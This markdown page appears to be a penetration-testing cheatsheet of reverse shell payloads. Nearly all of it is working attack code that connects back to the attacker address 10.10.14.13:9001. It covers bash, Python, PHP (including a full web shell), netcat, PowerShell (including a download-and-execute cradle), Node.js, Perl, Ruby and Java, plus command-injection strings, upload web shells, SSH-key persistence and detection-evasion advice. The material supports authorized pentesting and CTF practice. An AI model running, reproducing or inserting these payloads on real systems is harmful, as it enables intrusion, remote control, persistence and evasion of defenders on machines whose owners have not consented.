+++
title = 'Reverse Shell Cheatsheet'
date = '2024-01-01'
draft = false
description = 'Comprehensive collection of reverse shell commands, payloads, and techniques for various platforms and languages'
tags = ['reverse-shells', 'payload', 'post-exploitation', 'pentesting']
categories = ['cheatsheets']
+++

# Reverse Shell Cheatsheet

## Setup Listener

### Netcat Listener
```bash
# Basic netcat listener
nc -nlvp 9001

# Enhanced with rlwrap for better shell experience
rlwrap nc -nlvp 9001

# OpenBSD netcat
nc -nlvp 9001

# Traditional netcat
nc -l -p 9001
```

### Socat Listener
```bash
# Basic socat listener
socat file:`tty`,raw,echo=0 tcp-listen:9001

# Encrypted socat listener
socat openssl-listen:9001,cert=server.crt,key=server.key,verify=0 -
```

---

## Bash Reverse Shells

### Basic Bash
```bash
# Standard bash reverse shell
bash -i >& /dev/tcp/10.10.14.13/9001 0>&1

# Alternative syntax
bash -c 'bash -i >& /dev/tcp/10.10.14.13/9001 0>&1'

# URL encoded for web applications
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261%27

# Base64 encoded
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85MDAxIDA+JjE= | base64 -d | bash
```

### Bash Variations
```bash
# Using exec
exec 5<>/dev/tcp/10.10.14.13/9001;cat <&5 | while read line; do $line 2>&5 >&5; done

# Using /bin/sh
/bin/sh -i >& /dev/tcp/10.10.14.13/9001 0>&1

# With specific shell path
/usr/bin/bash -i >& /dev/tcp/10.10.14.13/9001 0>&1
```

---

## Python Reverse Shells

### Python 2 & 3 Compatible
```python
# Standard Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python with pty spawn
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh");'

# Python3 specific
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python PTY Shell
```python
# Interactive shell with PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Local Python PTY spawn (after getting basic shell)
/usr/local/bin/python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### Advanced Python Shell
```python
# Multi-line Python reverse shell
import socket, subprocess, os, threading, sys

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.13", 9001))
p = subprocess.Popen(["/bin/sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
p2s_thread = threading.Thread(target=p2s, args=[s, p])
s2p_thread.daemon = True
p2s_thread.daemon = True
s2p_thread.start()
p2s_thread.start()
try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

---

## PHP Reverse Shells

### Basic PHP
```php
# Simple PHP reverse shell
php -r '$sock=fsockopen("10.10.14.13",9001);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP with error handling
php -r '$sock=fsockopen("10.10.14.13",9001);if($sock){$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);}'
```

### Web-based PHP Shell
```php
<?php
set_time_limit(0);
$ip = '10.10.14.13';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }
    
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }
    
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

### PHP Command Execution
```php
# Simple PHP command execution
<?php system($_GET['cmd']); ?>

# More advanced web shell
<?php 
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

# POST request shell
# POST /shell.php
# cmd=bash -c 'bash -i /dev/tcp/10.10.14.13/9001 0>&1'
```

---

## Netcat Reverse Shells

### Traditional Netcat
```bash
# Basic netcat reverse shell
nc -e /bin/sh 10.10.14.13 9001

# Alternative if -e is not available
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 9001 >/tmp/f

# Using ncat (Nmap's netcat)
ncat 10.10.14.13 9001 -e /bin/bash

# OpenBSD netcat
nc 10.10.14.13 9001 -e /bin/sh
```

### Advanced Netcat
```bash
# Netcat with PTY
nc -e /bin/bash 10.10.14.13 9001

# Netcat persistent shell
while true; do nc -e /bin/bash 10.10.14.13 9001; sleep 60; done

# UDP reverse shell
nc -u 10.10.14.13 9001 -e /bin/bash
```

---

## PowerShell Reverse Shells (Windows)

### Basic PowerShell
```powershell
# Simple PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded PowerShell
powershell -enc <base64_encoded_command>

# Download and execute
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/shell.ps1')"
```

### Advanced PowerShell
```powershell
# PowerShell with authentication bypass
powershell -ExecutionPolicy Bypass -File shell.ps1

# PowerShell one-liner (formatted)
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.13",9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

---

## Node.js Reverse Shells

### Basic Node.js
```javascript
# Simple Node.js reverse shell
node -e "require('child_process').exec('nc -e /bin/sh 10.10.14.13 9001')"

# Pure Node.js implementation
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9001, "10.10.14.13", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## Other Language Shells

### Perl
```perl
# Perl reverse shell
perl -e 'use Socket;$i="10.10.14.13";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Alternative Perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.13:9001");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby
```ruby
# Ruby reverse shell
ruby -rsocket -e 'f=TCPSocket.open("10.10.14.13",9001).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Alternative Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.13","9001");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Java
```java
# Java reverse shell
import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) throws Exception {
        Socket s = new Socket("10.10.14.13", 9001);
        Process p = Runtime.getRuntime().exec("/bin/bash");
        InputStream pi = p.getInputStream();
        InputStream pe = p.getErrorStream();
        InputStream si = s.getInputStream();
        OutputStream po = p.getOutputStream();
        OutputStream so = s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0) so.write(pi.read());
            while(pe.available()>0) so.write(pe.read());
            while(si.available()>0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {}
        }
        p.destroy();
        s.close();
    }
}
```

---

## Shell Stabilization

### TTY Upgrade
```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell
CTRL + Z

# Set raw mode and foreground
stty raw -echo; fg

# Set terminal environment
export TERM=xterm

# Check screen size and set
stty -a 
stty rows 28 cols 110
```

### Alternative TTY Methods
```bash
# Using script
script -qc /bin/bash /dev/null

# Using socat (if available on target)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001

# Using expect
expect -c "spawn /bin/bash; interact"
```

---

## SSH-Based Access

### sshpass for Automated SSH Login
```bash
# Install sshpass
sudo apt install sshpass

# SSH with password (from extracted credentials)
sshpass -p 'PlayerOftheMatch2022' ssh player@10.10.11.194

# SSH with password from file
echo 'password123' > /tmp/pass
sshpass -f /tmp/pass ssh user@target

# SSH with password and command execution
sshpass -p 'password' ssh user@target 'whoami'

# Disable host key checking for testing
sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@target
```

### SSH Key-Based Access
```bash
# Use existing private key
ssh -i /path/to/private_key user@target

# SSH with specific key and no host checking
ssh -i /path/to/key -o StrictHostKeyChecking=no user@target

# Generate SSH key pair for persistence
ssh-keygen -t rsa -f /tmp/key -N ""

# Copy public key to target (if possible)
cat /tmp/key.pub >> ~/.ssh/authorized_keys
```

### Shell Enhancement
```bash
# Set environment variables
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
export HOME=/tmp

# Enable command history
export HISTFILE=/tmp/.bash_history

# Color prompt
export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
```

---

## Web Application Payloads

### Command Injection in Web Forms
```bash
# Basic command injection
; bash -i >& /dev/tcp/10.10.14.13/9001 0>&1

# URL encoded
%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261

# In JSON
{"cmd": "; bash -i >& /dev/tcp/10.10.14.13/9001 0>&1"}

# As POST parameter
cmd=bash -c 'bash -i /dev/tcp/10.10.14.13/9001 0>&1'
```

### File Upload Shells
```php
# Simple PHP upload shell
<?php system($_GET['cmd']); ?>

# Save as shell.php and upload, then access:
# http://target.com/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.13 9001
```

---

## Troubleshooting

### Common Issues
```bash
# No netcat with -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 9001 >/tmp/f

# Firewall blocking outbound connections
# Try different ports: 80, 443, 53, 25
nc 10.10.14.13 443 -e /bin/bash

# Limited shell environment
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# No interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Testing Connectivity
```bash
# Test if target can reach your IP
ping 10.10.14.13

# Test specific port
telnet 10.10.14.13 9001
nc -nv 10.10.14.13 9001

# DNS exfiltration test
nslookup test.yourdomain.com
```

---

## Security Considerations

### Operational Security
- Use encrypted channels when possible (HTTPS, SSH tunnels)
- Avoid leaving artifacts on target systems
- Clean up uploaded files and temporary files
- Use staging servers to avoid direct connections

### Detection Evasion
- Use common ports (80, 443, 53) to blend with normal traffic
- Implement delays between connection attempts
- Use domain names instead of IP addresses when possible
- Rotate source IP addresses if available

---

*Always ensure you have proper authorization before deploying reverse shells on any target system. These techniques should only be used for legitimate security testing purposes.*